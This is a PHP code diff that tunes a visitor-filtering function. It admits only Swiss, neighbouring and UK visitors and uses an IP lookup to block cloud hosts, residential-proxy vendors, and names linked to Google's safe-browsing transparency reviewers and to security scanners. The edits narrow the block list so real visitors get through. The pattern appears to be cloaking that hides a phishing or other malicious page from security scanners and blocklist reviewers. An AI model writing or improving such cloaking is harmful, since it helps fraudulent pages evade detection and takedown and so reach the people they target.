@@ -11,30 +11,27 @@ function checkGeolocation()
 {
     $allowed_countries = ['CH', 'FR', 'DE', 'IT', 'AT', 'LI', 'GB', 'UK']; // Switzerland + neighbors + UK
 
+    // HIGH CONFIDENCE blocks only (avoid false positives on residential IPs)
     $blocked_datacenters = [
-        'amazon', 'aws', 'ec2', 'google cloud', 'googleapis', 'googleapi',
-        'azure', 'microsoft', 'akamai', 'cloudflare', 'ovh', 'digitalocean',
-        'linode', 'vultr', 'hetzner', 'ramnode', 'softlayer', 'rackspace',
-        'alibaba', 'aliyun', 'tencent cloud', 'ibm cloud', 'oracle cloud',
-        'heroku', 'glitch', 'vercel', 'netlify', 'github', 'gitlab',
-        'render', 'fly.io', 'replit', 'codesandbox', 'supabase',
-        'datacenter', 'vps', 'dedicated', 'hosting provider', 'cloud',
-        'transparency', 'googleredtransparency', 'google-transparency',
-        'bot', 'crawler', 'scanner', 'monitor', 'check', 'test',
-        'proxy', 'vpn', 'tor', 'exit node', 'residential proxy',
-        'backconnect', 'luminati', 'oxylabs', 'bright data', 'smartproxy',
-        'apptunnel', 'geosurf', 'storm proxies', 'soax', 'buyproxies'
+        'amazon', 'aws', 'ec2', 'google cloud', 'google-cloud',
+        'azure', 'microsoft azure', 'akamai', 'cloudflare',
+        'alibaba', 'aliyun', 'tencent', 'ibm cloud',
+        'luminati', 'oxylabs', 'bright data', 'smartproxy',
+        'storm proxies', 'soax', 'buyproxies', 'backconnect',
+        'googleredtransparency', 'google-transparency'
     ];
 
     $ip = getClientIP();
 
-    // Use geoIP service with ISP info
+    // Try geoIP lookup with timeout
     $url = "http://ip-api.com/json/{$ip}?fields=countryCode,isp,org,as";
-    $geoData = @json_decode(file_get_contents($url), true);
+    $context = stream_context_create(['http' => ['timeout' => 3]]);
+    $geoData = @json_decode(file_get_contents($url, false, $context), true);
 
     if (!$geoData || !isset($geoData['countryCode'])) {
-        // If geoIP fails, block (safer than allowing unknown)
-        return showDatacenterBlockedPage('Unknown', $ip, 'Unable to verify IP location');
+        // If geoIP fails, ALLOW (don't block legitimate users)
+        @error_log("GeoIP lookup failed for IP: {$ip}");
+        return true;
     }
 
     $country = strtoupper($geoData['countryCode']);
@@ -42,15 +39,22 @@ function checkGeolocation()
     $org = strtolower($geoData['org'] ?? '');
     $as = strtolower($geoData['as'] ?? '');
 
+    // Debug log
+    @error_log("GeoIP Check - IP: {$ip}, Country: {$country}, ISP: {$isp}, Org: {$org}");
+
     // Check if country is allowed
     if (!in_array($country, $allowed_countries)) {
+        @error_log("Country blocked: {$country} for IP {$ip}");
         return showGeoBlockedPage($country, $ip);
     }
 
-    // Check if ISP/Org is a blocked datacenter or service
+    // Check if ISP/Org is a CONFIRMED blocked datacenter (only high confidence matches)
     $fullString = "{$isp} {$org} {$as}";
+    $fullString = strtolower($fullString);
+
     foreach ($blocked_datacenters as $blocked) {
-        if (strpos($fullString, $blocked) !== false) {
+        if (strpos($fullString, strtolower($blocked)) !== false) {
+            @error_log("Datacenter blocked: {$blocked} detected in '{$isp} {$org}' for IP {$ip}");
             return showDatacenterBlockedPage($country, $ip, ucfirst($blocked));
         }
     }
